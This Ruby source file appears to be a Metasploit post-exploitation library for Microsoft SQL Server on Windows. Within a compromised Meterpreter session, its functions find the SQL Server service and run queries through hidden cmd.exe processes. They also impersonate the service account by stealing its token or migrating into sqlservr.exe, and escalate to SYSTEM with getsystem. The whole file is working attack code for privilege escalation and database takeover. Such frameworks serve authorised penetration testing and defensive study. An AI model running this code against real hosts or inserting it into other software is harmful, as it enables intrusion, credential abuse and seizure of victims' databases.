# -*- coding: binary -*-

module Msf
  class Post
    module Windows
      module MSSQL
        # @return [String, nil] contains the identified SQL command line client
        attr_accessor :sql_client

        include Msf::Exploit::Remote::MSSQL_COMMANDS
        include Msf::Post::Windows::Services
        include Msf::Post::Windows::Priv

        def initialize(info = {})
          super(
            update_info(
              info,
              'Compat' => {
                'Meterpreter' => {
                  'Commands' => %w[
                    core_migrate
                    incognito_impersonate_token
                    priv_elevate_getsystem
                    stdapi_sys_config_getprivs
                    stdapi_sys_config_getuid
                    stdapi_sys_process_execute
                    stdapi_sys_process_get_processes
                  ]
                }
              }
            )
          )
        end

        # Identifies the Windows Service matching the SQL Server instance name
        #
        # @param [String] instance the SQL Server instance name to locate
        # @return [Hash, nil] the Windows Service instance
        def check_for_sqlserver(instance = nil)
          target_service = nil
          each_service do |service|
            if instance.to_s.strip.empty?
              # Target default instance
              if service[:display] =~ /SQL Server \(|^MSSQLSERVER|^MSSQL\$/i &&
                 service[:display] !~ /OLAPService|ADHelper/i &&
                 service[:pid].to_i > 0

                target_service = service
                break
              end
            elsif (
                  service[:display].downcase.include?("SQL Server (#{instance}".downcase) || # 2k8
                  service[:display].downcase.include?("MSSQL$#{instance}".downcase) || # 2k
                  service[:display].downcase.include?("MSSQLServer#{instance}".downcase) || # 2k5
                  service[:display].downcase == instance.downcase # If the user gets very specific
                ) &&
                  service[:display] !~ /OLAPService|ADHelper/i &&
                  service[:pid].to_i > 0
              target_service = service
              break
            end
          end

          if target_service
            target_service.merge!(service_info(target_service[:name]))
          end

          target_service
        end

        # Identifies a valid SQL Server command line client on the host and sets
        # sql_client
        #
        # @see sql_client
        # @return [String, nil] the SQL command line client
        def get_sql_client
          client = nil

          if check_sqlcmd
            client = 'sqlcmd'
          elsif check_osql
            client = 'osql'
          end

          @sql_client = client
          client
        end

        # Attempts to run the osql command line tool
        #
        # @return [Boolean] true if osql is present
        def check_osql
          result = run_cmd('osql -?')
          result =~ /(SQL Server Command Line Tool)|(usage: osql)/i
        end

        # Attempts to run the sqlcmd command line tool
        #
        # @return [Boolean] true if sqlcmd is present
        def check_sqlcmd
          result = run_cmd('sqlcmd -?')
          result =~ /SQL Server Command Line Tool|Version v\d+/i
        end

        # Runs a SQL query using the identified command line tool
        #
        # @param [String] query the query to execute
        # @param [String] instance the SQL instance to target
        # @param [String] server the SQL server to target
        # @param [String] database the database to connect to upon successfully authenticating
        # @param [String] username the username to authenticate as
        # @param [String] password the password to authenticate with
        # @return [String] the result of query
        def run_sql(query, instance = nil, server = '.', database: nil, username: nil, password: nil)
          target = server
          if instance && instance.downcase != 'mssqlserver'
            target = "#{server}\\#{instance}"
          end
          cmd = sql_client.to_s
          cmd += " -d #{database}" if database.present?
          if username.present? && password.nil?
            raise ArgumentError, 'Username provided but no value for the password was provided!'
          elsif username.present? && !password.nil?
            cmd += " -U \"#{username}\" -P \"#{password}\""
          elsif username.blank? && !password.nil?
            cmd += " -P \"#{password}\""
          else
            cmd += ' -E'
          end

          cmd += " -S #{target} -Q \"#{query}\" -h -1 -w 200"
          vprint_status(cmd)
          run_cmd(cmd)
        end

        # Executes a hidden command
        #
        # @param [String] cmd the command line to execute
        # @param [Boolean] token use the current thread token
        # @return [String] the results from the command
        #
        # @note This may fail as SYSTEM if the current process
        #  doesn't have sufficient privileges to duplicate a token,
        #  e.g. SeAssignPrimaryToken
        def run_cmd(cmd, token = true)
          opts = { 'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token }
          process = session.sys.process.execute("cmd.exe /c #{cmd}", nil, opts)
          res = ''
          while (d = process.channel.read)
            break if d == ''

            res << d
          end
          process.channel.close
          process.close

          res
        end

        # Attempts to impersonate the user of the supplied service
        # If the process has the appropriate privileges it will attempt to
        # steal a token to impersonate, otherwise it will attempt to migrate
        # into the service process.
        #
        # @note This may cause the meterpreter session to migrate!
        #
        # @param [Hash] service the service to target
        # @return [Boolean] true if impersonated successfully
        def impersonate_sql_user(service)
          return false if service.nil? || service[:pid].nil? || service[:pid] <= 0

          pid = service[:pid]
          vprint_status("Current user: #{session.sys.config.getuid}")
          current_privs = client.sys.config.getprivs
          if current_privs.include?('SeImpersonatePrivilege') ||
             current_privs.include?('SeTcbPrivilege') ||
             current_privs.include?('SeAssignPrimaryTokenPrivilege')
            username = nil
            session.sys.process.each_process do |process|
              if process['pid'] == pid
                username = process['user']
                break
              end
            end

            return false unless username

            session.core.use('incognito') unless session.incognito
            vprint_status("Attempting to impersonate user: #{username}")
            res = session.incognito.incognito_impersonate_token(username)

            if res =~ /Successfully/i
              print_good("Impersonated user: #{username}")
              return true
            else
              return false
            end
          else
            # Attempt to migrate to target sqlservr.exe process
            # Migrating works, but I can't rev2self after its complete
            print_warning("No SeImpersonatePrivilege, attempting to migrate to process #{pid}...")
            begin
              session.core.migrate(pid)
            rescue Rex::RuntimeError => e
              print_error(e.to_s)
              return false
            end

            vprint_status("Current user: #{session.sys.config.getuid}")
            print_good("Successfully migrated to sqlservr.exe process #{pid}")
          end

          true
        end

        # Attempts to escalate the meterpreter session to SYSTEM
        #
        # @return [Boolean] true if escalated successfully or user is already SYSTEM
        def get_system
          print_status('Checking if user is SYSTEM...')

          if is_system?
            print_good('User is SYSTEM')
            return true
          else
            # Attempt to get LocalSystem privileges
            print_warning('Attempting to get SYSTEM privileges...')
            system_status = session.priv.getsystem
            if system_status && system_status.first
              print_good('Success, user is now SYSTEM')
              return true
            else
              print_error('Unable to obtained SYSTEM privileges')
              return false
            end
          end
        end
      end # MSSQL
    end # Windows
  end # Post
end # Msf
